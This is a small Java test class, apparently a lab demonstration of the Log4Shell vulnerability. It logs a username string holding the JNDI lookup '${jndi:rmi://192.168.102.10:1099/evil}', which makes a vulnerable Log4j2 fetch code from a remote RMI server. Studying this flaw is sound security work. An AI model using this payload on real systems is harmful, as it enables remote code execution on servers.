package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {
    private static Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
//        String username="zhangsan";
//        String username="${java:vm}";
        String username = "${jndi:rmi://192.168.102.10:1099/evil}";
        logger.info("当前登录用户为:{}", username);
    }
}
